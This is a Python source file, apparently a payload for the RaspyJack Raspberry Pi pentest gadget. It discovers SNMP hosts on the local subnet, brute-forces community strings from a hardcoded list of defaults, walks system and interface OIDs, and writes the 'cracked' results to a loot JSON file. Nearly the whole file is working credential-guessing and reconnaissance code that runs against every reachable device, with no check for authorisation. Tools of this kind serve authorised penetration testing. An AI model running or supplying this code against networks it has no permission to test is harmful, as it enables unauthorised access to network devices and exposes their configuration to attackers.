#!/usr/bin/env python3
"""
RaspyJack Payload -- SNMP Community Brute-Force + MIB Walk
==========================================================
Author: 7h30th3r0n3

Discovers SNMP hosts on the local network (UDP 161), brute-forces
community strings, and walks common MIB OIDs using raw SNMPv1/v2c
packets via scapy.

Controls:
  OK         -- Start brute-force / walk
  UP / DOWN  -- Scroll results
  KEY1       -- Scan for SNMP hosts
  KEY2       -- Export results to loot
  KEY3       -- Exit

Loot: /root/Raspyjack/loot/SNMP/snmp_YYYYMMDD_HHMMSS.json
"""

import os
import sys
import json
import time
import socket
import threading
import subprocess
import ipaddress
from datetime import datetime

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))

import RPi.GPIO as GPIO
import LCD_1in44
import LCD_Config
from PIL import Image, ImageDraw, ImageFont
from payloads._display_helper import ScaledDraw, scaled_font
from payloads._input_helper import get_button

try:
    from scapy.all import (
        IP, UDP, SNMP, SNMPget, SNMPnext, SNMPvarbind,
        ASN1_OID, ASN1_STRING, sr1, conf,
    )
    SCAPY_OK = True
except ImportError:
    SCAPY_OK = False

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
PINS = {
    "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26,
    "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16,
}
WIDTH, HEIGHT = LCD_1in44.LCD_WIDTH, LCD_1in44.LCD_HEIGHT
ROWS_VISIBLE = 6
ROW_H = 12
LOOT_DIR = "/root/Raspyjack/loot/SNMP"

COMMUNITY_STRINGS = [
    "public", "private", "community", "manager", "admin",
    "cisco", "snmp", "default", "monitor", "read",
    "write", "test", "guest", "secret", "network",
]

# Common OIDs to walk
WALK_OIDS = {
    "sysDescr": "1.3.6.1.2.1.1.1.0",
    "sysName": "1.3.6.1.2.1.1.5.0",
    "sysLocation": "1.3.6.1.2.1.1.6.0",
    "sysContact": "1.3.6.1.2.1.1.4.0",
    "sysUpTime": "1.3.6.1.2.1.1.3.0",
    "ifNumber": "1.3.6.1.2.1.2.1.0",
    "ifDescr.1": "1.3.6.1.2.1.2.2.1.2.1",
    "ifDescr.2": "1.3.6.1.2.1.2.2.1.2.2",
    "ipForwarding": "1.3.6.1.2.1.4.1.0",
    "ipRouteDest.1": "1.3.6.1.2.1.4.21.1.1",
}

# ---------------------------------------------------------------------------
# Shared state
# ---------------------------------------------------------------------------
lock = threading.Lock()
_running = True
phase = "idle"       # idle | scanning | bruting | walking | done
hosts = []           # [{ip, port}]
results = {}         # {ip: {community: str, oids: {name: value}}}
scroll = 0
selected_idx = 0
status_msg = "Ready. KEY1 to scan."
brute_progress = 0   # 0-100


# ---------------------------------------------------------------------------
# Network detection
# ---------------------------------------------------------------------------

def _detect_subnet():
    """Detect local subnet."""
    for candidate in ["eth0", "wlan0"]:
        try:
            r = subprocess.run(["ip", "-4", "addr", "show", candidate],
                               capture_output=True, text=True, timeout=5)
            for line in r.stdout.splitlines():
                line = line.strip()
                if line.startswith("inet "):
                    return line.split()[1]
        except Exception:
            pass
    try:
        r = subprocess.run(["ip", "-4", "route", "show", "default"],
                           capture_output=True, text=True, timeout=5)
        for line in r.stdout.splitlines():
            parts = line.split()
            if "dev" in parts:
                iface = parts[parts.index("dev") + 1]
                r2 = subprocess.run(["ip", "-4", "addr", "show", iface],
                                    capture_output=True, text=True, timeout=5)
                for ln in r2.stdout.splitlines():
                    ln = ln.strip()
                    if ln.startswith("inet "):
                        return ln.split()[1]
    except Exception:
        pass
    return None


# ---------------------------------------------------------------------------
# SNMP helper: raw get request
# ---------------------------------------------------------------------------

def _snmp_get(target_ip, community, oid, timeout_sec=2):
    """Send SNMP GET and return response value string or None."""
    try:
        pkt = (IP(dst=target_ip)
               / UDP(sport=44161, dport=161)
               / SNMP(community=community,
                      PDU=SNMPget(varbindlist=[
                          SNMPvarbind(oid=ASN1_OID(oid))])))
        resp = sr1(pkt, timeout=timeout_sec, verbose=False)
        if resp and resp.haslayer(SNMP):
            snmp_layer = resp[SNMP]
            try:
                varbind = snmp_layer.PDU.varbindlist[0]
                val = varbind.value
                if hasattr(val, "val"):
                    return str(val.val)
                return str(val)
            except Exception:
                pass
    except Exception:
        pass
    return None


def _snmp_probe(target_ip, community, timeout_sec=2):
    """Quick SNMP probe: try sysDescr to verify community string."""
    return _snmp_get(target_ip, community, "1.3.6.1.2.1.1.1.0", timeout_sec)


# ---------------------------------------------------------------------------
# Host discovery thread
# ---------------------------------------------------------------------------

def _scan_hosts_thread(cidr):
    """Scan subnet for SNMP hosts (UDP 161 reachable)."""
    global phase, status_msg
    found = []

    try:
        network = ipaddress.IPv4Network(cidr, strict=False)
    except ValueError:
        with lock:
            phase = "idle"
            status_msg = "Invalid subnet"
        return

    host_ips = [str(h) for h in network.hosts()]
    # Limit to /24 at most
    if len(host_ips) > 254:
        host_ips = host_ips[:254]

    for i, ip in enumerate(host_ips):
        if not _running:
            break
        with lock:
            status_msg = f"Probing {ip} ({i + 1}/{len(host_ips)})"

        # Quick UDP probe using socket
        sock = None
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(0.5)
            # Send a minimal SNMPv1 GET sysDescr
            snmp_req = (
                b"\x30\x29\x02\x01\x00\x04\x06public"
                b"\xa0\x1c\x02\x04\x00\x00\x00\x01"
                b"\x02\x01\x00\x02\x01\x00"
                b"\x30\x0e\x30\x0c\x06\x08"
                b"\x2b\x06\x01\x02\x01\x01\x01\x00"
                b"\x05\x00"
            )
            sock.sendto(snmp_req, (ip, 161))
            data, _ = sock.recvfrom(4096)
            if data:
                found.append({"ip": ip, "port": 161})
        except (socket.timeout, OSError):
            pass
        finally:
            if sock:
                sock.close()

    with lock:
        hosts.clear()
        hosts.extend(found)
        if found:
            phase = "idle"
            status_msg = f"Found {len(found)} SNMP hosts"
        else:
            phase = "idle"
            status_msg = "No SNMP hosts found"


# ---------------------------------------------------------------------------
# Brute-force + walk thread
# ---------------------------------------------------------------------------

def _brute_walk_thread(target_hosts):
    """Brute-force community strings then walk MIBs."""
    global phase, status_msg, brute_progress

    total_attempts = len(target_hosts) * len(COMMUNITY_STRINGS)
    done = 0

    for host in target_hosts:
        if not _running:
            break
        ip = host["ip"]

        for comm in COMMUNITY_STRINGS:
            if not _running:
                break
            done += 1
            with lock:
                brute_progress = int(done / max(total_attempts, 1) * 100)
                status_msg = f"Trying {ip} / {comm}"

            resp = _snmp_probe(ip, comm, timeout_sec=1)
            if resp:
                with lock:
                    if ip not in results:
                        results[ip] = {"community": comm, "oids": {}}
                    else:
                        results[ip] = {**results[ip], "community": comm}
                break

    # Walk OIDs on successful hosts
    with lock:
        successful = {ip: data["community"] for ip, data in results.items()}

    for ip, comm in successful.items():
        if not _running:
            break
        with lock:
            status_msg = f"Walking {ip}..."

        oid_data = {}
        for name, oid in WALK_OIDS.items():
            if not _running:
                break
            val = _snmp_get(ip, comm, oid, timeout_sec=2)
            if val:
                oid_data[name] = val

        with lock:
            if ip in results:
                results[ip] = {**results[ip], "oids": oid_data}

    with lock:
        phase = "done"
        found_count = len(results)
        status_msg = f"Done: {found_count} hosts cracked"


# ---------------------------------------------------------------------------
# Export
# ---------------------------------------------------------------------------

def _export_loot():
    """Write results to JSON."""
    os.makedirs(LOOT_DIR, exist_ok=True)
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    filepath = os.path.join(LOOT_DIR, f"snmp_{ts}.json")
    with lock:
        data = {
            "timestamp": ts,
            "hosts_found": len(hosts),
            "cracked": len(results),
            "results": {ip: dict(info) for ip, info in results.items()},
        }
    with open(filepath, "w") as fh:
        json.dump(data, fh, indent=2)
    return os.path.basename(filepath)


# ---------------------------------------------------------------------------
# Display
# ---------------------------------------------------------------------------

def _draw_frame(lcd, font):
    """Render current state to the LCD."""
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)

    d.rectangle((0, 0, 127, 13), fill="#111")
    d.text((2, 1), "SNMP WALKER", font=font, fill="#00FF88")
    active = phase in ("scanning", "bruting", "walking")
    d.ellipse((118, 3, 122, 7), fill="#00FF00" if active else "#444")

    with lock:
        msg = status_msg
        cur_phase = phase
        host_list = list(hosts)
        result_list = list(results.items())
        prog = brute_progress

    d.text((2, 16), msg[:24], font=font, fill="#AAAAAA")

    if cur_phase == "bruting":
        # Progress bar
        bar_x, bar_y, bar_w, bar_h = 4, 28, 120, 8
        d.rectangle((bar_x, bar_y, bar_x + bar_w, bar_y + bar_h), outline="#444")
        fill_w = int(prog / 100 * (bar_w - 2))
        if fill_w > 0:
            d.rectangle((bar_x + 1, bar_y + 1, bar_x + 1 + fill_w, bar_y + bar_h - 1),
                        fill="#00FF88")
        d.text((2, 40), f"Progress: {prog}%", font=font, fill="#888")

    if cur_phase in ("idle", "done") and host_list:
        d.text((2, 28), f"Hosts: {len(host_list)} Cracked: {len(result_list)}",
               font=font, fill="#888")

    # Results display
    if result_list:
        display_lines = []
        for ip, info in result_list:
            display_lines.append(f"{ip} [{info.get('community', '?')}]")
            for name, val in info.get("oids", {}).items():
                display_lines.append(f"  {name}: {val[:16]}")

        visible = display_lines[scroll:scroll + ROWS_VISIBLE]
        for i, line in enumerate(visible):
            y = 42 + i * ROW_H
            color = "#FFAA00" if line.startswith("  ") else "#CCCCCC"
            d.text((2, y), line[:24], font=font, fill=color)

    elif host_list and not result_list:
        visible = host_list[scroll:scroll + ROWS_VISIBLE]
        for i, h in enumerate(visible):
            y = 42 + i * ROW_H
            d.text((2, y), h["ip"], font=font, fill="#CCCCCC")

    d.rectangle((0, 116, 127, 127), fill="#111")
    if cur_phase in ("idle", "done"):
        d.text((2, 117), "OK:Start K1:Scan K3:Q", font=font, fill="#888")
    else:
        d.text((2, 117), "Working... K3:Exit", font=font, fill="#888")

    lcd.LCD_ShowImage(img, 0, 0)


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    global _running, phase, scroll, status_msg

    GPIO.setmode(GPIO.BCM)
    for pin in PINS.values():
        GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

    LCD_Config.GPIO_Init()
    lcd = LCD_1in44.LCD()
    lcd.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
    lcd.LCD_Clear()
    font = scaled_font()

    if not SCAPY_OK:
        img = Image.new("RGB", (WIDTH, HEIGHT), "black")
        d = ScaledDraw(img)
        d.text((4, 50), "scapy not found!", font=font, fill="#FF0000")
        lcd.LCD_ShowImage(img, 0, 0)
        time.sleep(3)
        GPIO.cleanup()
        return 1

    cidr = _detect_subnet()
    if cidr:
        status_msg = f"Net: {cidr}  KEY1=Scan"
    else:
        status_msg = "No network. KEY1=retry"

    try:
        while _running:
            btn = get_button(PINS, GPIO)

            if btn == "KEY3":
                break

            elif btn == "KEY1" and phase not in ("scanning", "bruting"):
                if not cidr:
                    cidr = _detect_subnet()
                if cidr:
                    phase = "scanning"
                    scroll = 0
                    threading.Thread(target=_scan_hosts_thread, args=(cidr,),
                                     daemon=True).start()
                else:
                    with lock:
                        status_msg = "No network found"
                time.sleep(0.3)

            elif btn == "OK" and phase in ("idle", "done"):
                with lock:
                    target = list(hosts)
                if target:
                    phase = "bruting"
                    threading.Thread(target=_brute_walk_thread, args=(target,),
                                     daemon=True).start()
                else:
                    with lock:
                        status_msg = "No hosts. KEY1=Scan"
                time.sleep(0.3)

            elif btn == "KEY2":
                with lock:
                    has_data = len(results) > 0
                if has_data:
                    fname = _export_loot()
                    with lock:
                        status_msg = f"Saved: {fname[:20]}"
                else:
                    with lock:
                        status_msg = "No data to export"
                time.sleep(0.3)

            elif btn == "UP":
                scroll = max(0, scroll - 1)
                time.sleep(0.15)

            elif btn == "DOWN":
                scroll += 1
                time.sleep(0.15)

            _draw_frame(lcd, font)
            time.sleep(0.05)

    finally:
        _running = False
        time.sleep(0.3)
        try:
            lcd.LCD_Clear()
        except Exception:
            pass
        GPIO.cleanup()

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
